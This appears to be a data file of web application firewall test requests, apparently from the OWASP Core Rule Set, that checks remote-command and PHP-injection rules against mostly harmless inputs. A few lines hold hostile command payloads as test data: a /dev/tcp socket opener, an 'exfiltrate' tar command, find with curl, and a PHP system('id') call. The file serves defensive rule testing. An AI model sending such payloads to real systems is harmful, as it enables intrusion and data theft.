+RCE	GET	/get		python-requests/2.31.0			User-Agent: python-requests/2.31.0
+RCE	GET	/get		Python-urllib/3.9			User-Agent: Python-urllib/3.9
+RCE	GET	/get		Snap URL Preview Service; bot; snapchat; https://developers.snap.com/robots			User-Agent: Snap URL Preview Service; bot; snapchat; https://developers.snap.com/robots
+RCE	GET	/get		w3m/0.5.1			User-Agent: w3m/0.5.1
+RCE	GET	/get		Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)			User-Agent: Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)
+RCE	GET	/get		wget			User-Agent: wget
+RCE	GET	/get		curl/7.81.0			User-Agent: curl/7.81.0
+RCE	GET	/get		Cpanel-HTTP-Client/1.0			User-Agent: Cpanel-HTTP-Client/1.0
+RCE	GET	/get		https://example.com/?args=comment			User-Agent: https://example.com/?args=comment
+RCE	GET	/get		https://example.com/?args=settings			User-Agent: https://example.com/?args=settings
+RCE	GET	/get		environment			User-Agent: environment
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://example.com/?args=environment
+RCE	GET	/get		performance			User-Agent: performance
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://example.com/?args=performance
+RCE	POST	/post		Mozilla/5.0 (Linux; Android 14; PGT-N19 Build/HONORPGT-N49; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.180 Mobile Safari/537.36			User-Agent: Mozilla/5.0 (Linux; Android 14; PGT-N19 Build/HONORPGT-N49; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.180 Mobile Safari/537.36
+RCE	POST	/post		iPhone (Nextcloud iOS)			User-Agent: iPhone (Nextcloud iOS)
+RCE	POST	/post		OWASP CRS test agent			User-Agent: OWASP CRS test agent referer: https://www.example.com/xyz/?abc=dfc987c2-72e2-4a8e-ad98-e0bf1bc3a01c
+RCE	POST	/post		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_1 rv:5.0; ps-AF) AppleWebKit/534.28.2 (KHTML, like Gecko) Version/4.0 Safari/534.28.2			User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_1 rv:5.0; ps-AF) AppleWebKit/534.28.2 (KHTML, like Gecko) Version/4.0 Safari/534.28.2
+RCE	POST	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: "aaaaaaaaaaaaaaaa"
+RCE	POST	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: 'aaaaaaaaaaaaaaaa'
+RCE	POST	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: %22The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog%22
+RCE	POST	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: 'The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog'
+RCE	POST	/post		OWASP CRS test agent		text=Schauen%20Sie%20sich%20diese%20Zahl%20an%3A%201%27000%27000 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		data%5Bwp-refresh-post-lock%5D%5Block%5D=1667487208%3A1&data%5Bwp-refresh-post-lock%5D%5Bpost_id%5D=1&interval=60&_nonce=25ed3b910d&action=heartbeat&screen_id=post&has_focus=false 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=All told, people were taken with the concept of Stadia, but the execution just didn't work. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=An affordable housing advocate says the city's rewrite of the land development code would boost affordable housing, but there's room to do more. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=%7B%22name%22:%22John%20Doe%22,%22age%22:%2230%22,%22email%22:%22johndoe@example.com%22%7D 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=%5B%22account%22%2C%22sharing%22%5D 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		932250-2=tar -xzf /var/www/exfiltrate.tar.gz /etc	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		932250-2=dont match commands that are not at start;tar -xzf /var/www/exfiltrate.tar.gz /etc	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		foo=tar is a dark brown or black bituminous usually odorous viscous liquid	User-Agent: OWASP CRS test agent
+RCE	GET	/get	x=kills%20foo%20bar	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	show_comments_cookies_opt_in=true	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent	ocvsgo2tnqtc=ls08e58tnf8b027oo1nr5sv3cc		User-Agent: OWASP CRS test agent Cookie: ocvsgo2tnqtc=ls08e58tnf8b027oo1nr5sv3cc
+RCE	GET	/get		OWASP CRS test agent	oc_sessionPassphrase=7ZSW6ZeHbe3SpaUje9ThKrPf86%2B6reu1QPtwIXFYhfGTtDUXa99eNn2P2Ve2SqeJAyq%2FXYPi1zuif%2FLRj3da0RUXYlTzizBACJ9HgiNQax72lEFNKajSuHuOeqYvVRgT		User-Agent: OWASP CRS test agent Cookie: oc_sessionPassphrase=7ZSW6ZeHbe3SpaUje9ThKrPf86%2B6reu1QPtwIXFYhfGTtDUXa99eNn2P2Ve2SqeJAyq%2FXYPi1zuif%2FLRj3da0RUXYlTzizBACJ9HgiNQax72lEFNKajSuHuOeqYvVRgT
+RCE	GET	/get	param=rc	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		code=|PG|XXX XXX Flash Sale Mxc3xa4rz 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=C:\Windows\System32\ls	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=\	User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=There%20isn%27t%20time%20to%20finish%20the%20test.	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=time%20to%20wash%20the%20car.	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=watch%20my%20english%20class	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	932260-1=bash%20-c%20%22echo%20test%22	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get		OWASP CRS test agent	931120-3=exec 5<>/dev/tcp/8.8.8.8/80		User-Agent: OWASP CRS test agent Cookie: 931120-3=exec 5<>/dev/tcp/8.8.8.8/80
+RCE	POST	/post		OWASP CRS test agent		932260-2=dont match commands that are not at start;tar -xzf /var/www/exfiltrate.tar.gz /etc	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		foo=ping pong tables	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		foo=time is of the essence	User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=time+warner+	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=time+curl+coreruleset.org	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=ti''me+curl+coreruleset.org	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	x=find%20.%201%20-exec%20curl%20google.com%20\;	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	x=find%20x%20for%20y	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	x=ping%20127.0.0.1	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		job_title=head%20of	User-Agent: OWASP CRS test agent
+RCE	GET	/get	word=evaluation	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	word=schedule	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=comment	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	last_name=Perlak	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	first_name=Axel	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	args=performance	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	last_name=Cronk	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		name=Axel Smith 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent	fpestid=SUDoLongRandomString		User-Agent: OWASP CRS test agent cookie: fpestid=SUDoLongRandomString
+RCE	POST	/post		OWASP CRS test agent		code=Compra a MODULAR ALUMINIO ESTRUCTURAL, STRUT PROFILE PG30 30X30 4 SLOTS | SELF TAPPING SCREW PG30 M1 	User-Agent: OWASP CRS test agent
+RCE	GET	/get	r=queue%2Fsendmails	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;"aaaaaaaaaaaaaaaa"	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'aaaaaaaaaaaaaaaa'	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;%22The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog%22	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog'	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		;stat%20space	User-Agent: OWASP CRS test agent
+RCE	GET	/get	r=sandboxing%20space	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	r=sandbox%20space	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/testing/chef-des-hauses		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	932270-5=%7E%2Bz	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	932270-6=%7E%2Bz	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	932270-7=%7Ez	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		932270-13=%7E%2Bz	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		932270-14=%7Ez	User-Agent: OWASP CRS test agent
+RCE	GET	/get	932271-13=%7E0	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		932271-14=%7E0	User-Agent: OWASP CRS test agent
+RCE	GET	/get	932270-15=abc%7E%2B1	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	x=xyz%7E%2D3	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	x=123%7E%2B1	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		932271-3=%7E%2Bz	User-Agent: OWASP CRS test agent
+RCE	GET	/get	932271-3=%7E%2Bz	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	932270-1=%7E%2B	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	932270-2=%7E%2D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	932281-6=%5B%7B%22value%22:true,%22key%22:%22enabled%22,%22scope%22:%22fileRequest%22%7D%5D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	932281-8=%7B%22single_blog_post_related_order_meta_first%22:%5B%7B%7D,%7B%7D%5D%7D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	text=We%20received%20this%20mail%20from%20Mars	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Hello%21%20We%20finally%20received%20this%20mail%20from%3A%3Ctest%40coreruleset.org%3E%2C%20which%20means%20that%20we%20can%20do%20this%20finally. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Hello%21%20This%20text%20introduces%20a%20typo%20when%20saying%20%22hello%22%20so%20we%20say%20ehlo%3A%20coreruleset.org%20to%20all%21 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Hello%21%20This%20text%20introduces%20a%20typo%20when%20saying%20%22receipt%20to%22%20so%20we%20say%20rcpt%20to%3A%20%3Ccoreruleset.org%3E 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=S%3A%20220%20foo.com%20Simple%20Mail%20Transfer%20Service%20Ready%0AC%3A%20EHLO%20bar.com%0AS%3A%20250-foo.com%20greets%20bar.com%0AS%3A%20250-8BITMIME%0AS%3A%20250-SIZE%0AS%3A%20250-DSN%0AS%3A%20250%20HELP%0AC%3A%20MAIL%20FROM%3A%3CSmith%40bar.com%3E%0AS%3A%20250%20OK%0AC%3A%20RCPT%20TO%3A%3CJones%40foo.com%3E%0AS%3A%20250%20OK%0AC%3A%20RCPT%20TO%3A%3CGreen%40foo.com%3E%0AS%3A%20550%20No%20such%20user%20here%0AC%3A%20RCPT%20TO%3A%3CBrown%40foo.com%3E%0AS%3A%20250%20OK%0AC%3A%20DATA%0AS%3A%20354%20Start%20mail%20input%3B%20end%20with%20%3CCRLF%3E.%3CCRLF%3E%0AC%3A%20Blah%20blah%20blah...%0AC%3A%20...etc.%20etc.%20etc.%0AC%3A%20.%0AS%3A%20250%20OK%0AC%3A%20QUIT%0AS%3A%20221%20foo.com%20Service%20closing%20transmission%20channel 	User-Agent: OWASP CRS test agent
+RCE	GET	/get	text=We%20need%20that%20data%20now	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Hello%21%20World.%0adata%20not%20found. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Hey%20please%20do%20not%20quit 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Hello%21%20This%20text%20needs%20help%20now 	User-Agent: OWASP CRS test agent
+RCE	GET	/get	text=I%20wanted%20to%20append%20something%20%28annoying%29%20%7Bclosed%7D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	text=Cannot%20authenticate%20anyways	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	text=Please%20send%20me%20an%20update%20status%20all%20messages%20are%20being%20denied	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	text=The%20uid%20is%020not%020working	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	text=We%examine%20this%20mail%20from%20Mars	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Just%20to%20remind%20you%20that%20I%20need%20to%20copy%20those%20documents 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=We%20need%20the%20list%20%22ASAP%22 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=%0aLet%27s%20go%20to%20the%20store%20%28sale%20time%21%29 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=In%20all%20search%20keys%20that%20use%20strings%2C%20a%20message%20matches%20the%20key%20if%20the%20string%20is%20a%20substring%20of%20the%20field.%20%20The%20matching%20is%20case-insensitive. 	User-Agent: OWASP CRS test agent
+RCE	GET	/get	text=Let%20me%20retrieve%2010%20of%20those	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=We%20should%20delete%20nine 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=This%20text%20is%20a%20way%20of%20list%203%20things 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=These%20are%20top%10%20rules 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Hey%2C%20sent%20me%20those%20auth%20codes%20please! 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Look%2C%20apop%20star! 	User-Agent: OWASP CRS test agent
+RCE	GET	/get	text=Don't%20quit	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=we%20do%20not%20have%20that%20capability 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Hi%20lestat! 	User-Agent: OWASP CRS test agent
+RCE	GET	/get	attackme=%0aSeriously%2C%20noop	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		textarea=Someone%20bought%20this%20nice%20lerset 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		id=4	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		pwd=supersecurepassword	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		uname=john%20doe	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		initials=DF	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		initials=SU	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		initials=LS	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		initials=PS	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=C:\Windows\System32\ls	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=\	User-Agent: OWASP CRS test agent
+RCE	GET	/search	w=hello+world	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		w=640&h=480	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+RCE	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://example.com/?keyword=w
+RCE	POST	/		OWASP CRS test agent		arg=;"aaaaaaaaaaaaaaaa"	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'aaaaaaaaaaaaaaaa'	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;%22The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog%22	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog'	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;"aaaaaaaaaaaaaaaa"	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'aaaaaaaaaaaaaaaa'	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;%22The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog%22	User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		arg=;'The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog'	User-Agent: OWASP CRS test agent
+RCE	GET	/get	cmd=regedit%20	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=time+warner+	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	cmd=Go%20to%20store.%0AAt%20the%20store%2C%20shop.	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/page	url=https://example.com	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get/www/delivery/lg.php	bannerid=18&campaignid=1&zoneid=4&loc=https%3A%2F%2Fwww.example.com%2Ffoo%2Fbar%2Fx-x%2Fx%3Fs%3D2014-11-01%26e%3D2020-10-31%26ex%3D7%26page%3D1%26sort%3Dex%26sort%3Ddescending&referer=https%3A%2F%2Fwww.example.com%2Ffoo%2Fbar%2Fx-x%2Fx%3Fs%3D2014-11-01%26e%3D2020-10-31%26ex%3D7%26page%3D1%26sort%3Dex%26sort%3Dascending&cb=7de91ea349	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get/url%2Fbla%3Ftest%3D1%26sort%3D0		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	GET	/get	foo=time+warner+	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=While this is a challenging time for us all, we are busy helping customers manage playout infrastructure in ways that were just dreams only a couple of years ago. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=El primer avión de la aerolínea fue en Curtiss Robin; voló rutas domésticas como transporte de correos y pasajeros. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=This street is the home of the Foreign Office, Mycroft's place of work; where the Mazarin Stone was stolen, and Percy Phelps chased the thief of the naval treaty. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=A brief overview of methods is presented here; for detailed coverage, see the cross-referenced articles. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=I have no money, but I’m gonna push through; if nothing happens by the end of next year, it’s a sign I need to move back home. 	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=the broadsword and windshield were goldsmith made	User-Agent: OWASP CRS test agent
+RCE	POST	/post		OWASP CRS test agent		payload=dsquery+ldifde+ntdsutil+csvde+dsacls+are+windows+tools	User-Agent: OWASP CRS test agent
+RCE	GET	/get	q=hello+world+(test)	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+RCE	POST	/		OWASP CRS test agent		code=myfunction%28%29%7B+echo+hello+%7D	User-Agent: OWASP CRS test agent
+RCE	GET	/get	url=http%3A%2F%2Fexample.com%3A8080%2Fpath	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	email=richard.php%40my-email.com	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get		OWASP CRS test agent	session=<?php		Cookie: session=<?php User-Agent: OWASP CRS test agent
+PHP	GET	/get	%3C%3Fphp=value	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=%3C%3Fxml%09version%3D%221.0%22%3F%3E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=%26lt%3B%3F%20should%20not%20trigger	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/api/test		OWASP CRS test agent		{"array":["php","test"]}	Content-Type: application/json User-Agent: OWASP CRS test agent
+PHP	GET	/get	pattern=%2F%5Ba-z%5D%7B1%2C5%7D%2F	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=%3C%3Fxpaquet	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/api/orders	flux=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3Corder%3E%3Cid%3E12345%3C%2Fid%3E%3C%2Forder%3E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	data=%3C%3Fxml-stylesheet%20type%3D%22text%2Fxsl%22%20href%3D%22style.xsl%22%3F%3E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/api	doc=%3C%3Fxml%20version%3D%221.0%22%20standalone%3D%22yes%22%3F%3E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/search	q=Is%20this%20a%20test%3F%20What%20do%20you%20think%3F	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/calc	expr=result%20%3D%20%28x%20%3C%205%29%20%3F%20yes%20%3A%20no	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	url=http%3A%2F%2Fexample.com%2Fpage%3Fid%3D123	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/upload		OWASP CRS test agent		image=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Csvg%3E%3C%2Fsvg%3E	User-Agent: OWASP CRS test agent
+PHP	GET	/get	style=%3C%3Fxsl-stylesheet%3F%3E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/js	code=var%20x%20%3D%20%28a%20%3C%20b%29%20%3F%20c%20%3A%20d%3B%20%2F%2F%20%3C%3Ftest%20comment	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/contact	email=user%40%5B192.168.1.1%5D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/upload		OWASP CRS test agent		metadata=%3C%3Fxpacket%20begin%3D%22%3F%22%20id%3D%22W5M0MpCehiHzreSzNTczkc9d%22%3F%3E	User-Agent: OWASP CRS test agent
+PHP	POST	/upload		OWASP CRS test agent		metadata=%3C%3Fxpacket%20end%3D%22w%22%3F%3E	User-Agent: OWASP CRS test agent
+PHP	GET	/test	tag=%3C%3Fxpacket	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/api		OWASP CRS test agent		xmp=%3C%3FXPACKET%20begin%3D%22%3F%22%20id%3D%22test%22%3F%3E	User-Agent: OWASP CRS test agent
+PHP	POST	/upload/pdf		OWASP CRS test agent		content=%3C%3Fxpacket%20begin%3D%22%3F%22%20id%3D%22W5M0MpCehiHzreSzNTczkc9d%22%3F%3E%3Cx%3Axmpmeta%20xmlns%3Ax%3D%22adobe%3Ans%3Ameta%2F%22%3E	User-Agent: OWASP CRS test agent
+PHP	GET	/meta	data=%3C%3FxPacket%20begin%3D%22%3F%22%20id%3D%22test%22%3F%3E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	code=%3C%3Fxphp%20system%28%27id%27%29%3B%20%3F%3E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/test	x=%3C%3Fxa%20test	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	val=%3C%3Fxb%20echo%201%3B	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	code=%3C%3Fecho%20%22test%22%3B%3F%3E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	data=%3C%3Fxsl-stylesheet%20type%3D%22text%2Fxsl%22%20href%3D%22style.xsl%22%3F%3E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post		OWASP CRS test agent		----------397236876 Content-Disposition: form-data; name="something/dangerous.php"; filename="safe.txt" Content-Type: text/plain  please don't block me ----------397236876-- 	User-Agent: OWASP CRS test agent Content-Type: multipart/form-data; boundary=--------397236876
+PHP	POST	/post		OWASP CRS test agent		----------397236876 Content-Disposition: form-data; name="file"; filename="safe.phpinfo" Content-Type: text/plain  please don't block me ----------397236876-- 	User-Agent: OWASP CRS test agent Content-Type: multipart/form-data; boundary=--------397236876
+PHP	GET	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	SAMLRequest=mhXNy9pMlFhTjBlRkkzSkpia1Y2cSMtPEE9PTwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjwvc2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ+PC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg==	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=$_SE%20RVER['test'];	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=$_%53%20ERVER['request_uri'];	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=$_%53ERVER['test'];	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	%24_COOKIE=value;	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=%24%7B%7D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=%24%20%7B%20%7D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=the%20files%20%28yep%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=exec%20%28	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=executor%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=cheval%28%24foo%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=audi%6ffile%28%24foo%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=the%20system%20is%20down%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=ecosystem%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=systems%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=system%20something%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post	a=preview	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post	a=exploration	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=RootAndLeafOpenCamera.jpg	OWASP CRS test agent			User-Agent: OWASP CRS test agent
